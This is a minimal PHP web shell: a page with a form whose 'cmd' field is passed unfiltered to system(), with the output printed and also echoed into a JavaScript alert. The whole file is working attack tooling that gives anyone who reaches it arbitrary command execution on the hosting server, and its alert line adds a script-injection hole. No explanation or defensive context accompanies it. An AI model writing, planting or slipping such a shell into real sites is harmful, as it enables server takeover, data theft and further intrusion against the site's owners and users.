<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        $a=system($_GET['cmd']);
        echo "<script>alert('$a');</script>";
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
